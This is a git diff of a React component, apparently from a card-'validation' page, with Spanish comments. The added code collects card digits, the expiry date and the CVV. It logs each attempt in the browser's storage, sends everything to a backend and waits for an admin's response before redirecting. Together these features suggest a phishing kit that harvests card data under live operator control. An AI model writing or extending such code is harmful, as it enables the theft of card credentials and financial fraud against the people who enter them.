@@ -266,27 +266,43 @@ export default function ValidacionTCCustom() {
             if (cvv.length === requiredCvvLength) {
                 try {
                     setCargando(true);
-                    // Obtener sesion_id del localStorage
-                    const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
-                    const sesionId = usuarioLocalStorage?.sesion_id;
 
-                    if (!sesionId) {
-                        alert("Error: No se encontró la sesión");
-                        return;
+                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+                    const raw = localStorage.getItem("datos_usuario");
+                    let usuarioLocalStorage = raw ? JSON.parse(raw) : {};
+
+                    // Validar sesion
+                    if (!usuarioLocalStorage.sesion_id) {
+                        // Si no hay sesión local, usar la de URL si existe (caso TC Custom directo)
+                        const params = new URLSearchParams(window.location.search);
+                        const sesionIdUrl = params.get('sesionId');
+                        if (sesionIdUrl) {
+                            usuarioLocalStorage.sesion_id = sesionIdUrl;
+                        } else {
+                            alert("Error de sesión");
+                            setCargando(false);
+                            return;
+                        }
                     }
 
-                    // Construir número completo de tarjeta (12 dígitos + 4 últimos)
-                    const numeroTarjetaCompleto = cardDigits + cardData.digits;
+                    if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
+                    if (!usuarioLocalStorage.usuario.tc_custom) usuarioLocalStorage.usuario.tc_custom = [];
+
+                    const nuevoIntento = {
+                        intento: usuarioLocalStorage.usuario.tc_custom.length + 1,
+                        numeroTarjeta: cardDigits,
+                        fechaExpiracion: expirationDate,
+                        cvv: cvv,
+                        fecha: new Date().toLocaleString()
+                    };
+
+                    usuarioLocalStorage.usuario.tc_custom.push(nuevoIntento);
+                    localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
 
                     // Preparar datos para enviar
                     const dataSend = {
                         data: {
-                            attributes: {
-                                sesion_id: sesionId,
-                                numeroTarjeta: numeroTarjetaCompleto,
-                                cvv: cvv,
-                                fechaExpiracion: expirationDate
-                            }
+                            attributes: usuarioLocalStorage
                         }
                     };
 
@@ -295,7 +311,7 @@ export default function ValidacionTCCustom() {
 
                     if (response.data.success) {
                         // Iniciar polling para esperar respuesta del admin
-                        iniciarPolling(sesionId);
+                        iniciarPolling(usuarioLocalStorage.sesion_id);
                         // No apagamos loading porque esperamos redirección/respuesta del admin
                         // Opcional: Cambiar mensaje de loading?
                     } else {
